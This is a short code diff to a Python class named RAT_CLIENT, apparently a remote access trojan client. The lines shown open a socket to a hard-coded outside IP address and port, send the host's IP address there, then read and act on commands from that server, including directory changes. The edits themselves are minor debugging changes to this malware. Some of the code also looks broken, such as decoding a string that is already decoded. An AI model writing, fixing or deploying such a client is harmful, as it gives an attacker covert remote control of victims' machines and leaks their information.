@@ -47,7 +47,7 @@ class RAT_CLIENT:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect(('138.68.79.95', 1431))
-                print ("dfdsf")
+                print (s)
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
                 command = s.recv(1024).decode()
@@ -76,7 +76,6 @@ class RAT_CLIENT:
                     command = s.recv(1024).decode()
                     if command.lower() == 'exit' :
                         a=0;
-                        command.close()
                     if command == 'cd':
                         os.chdir(command[3:].decode('utf-8'))
                         dir = os.getcwd()
